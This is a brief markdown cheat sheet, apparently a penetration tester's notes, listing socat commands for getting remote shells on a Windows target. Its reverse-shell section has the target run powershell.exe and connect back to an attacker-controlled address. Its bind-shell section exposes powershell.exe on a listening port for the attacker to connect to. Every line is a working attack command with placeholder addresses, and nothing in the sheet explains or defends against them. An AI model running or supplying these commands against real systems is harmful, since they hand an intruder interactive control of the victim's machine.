# socat shells

## Reverse shell:

```bash
# listener on attacking machine.
socat TCP-L:<port> -

# connector on target machine
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

## Bind Shell:

```bash
# windows listener
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

# connect to listener using attacking machine.
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
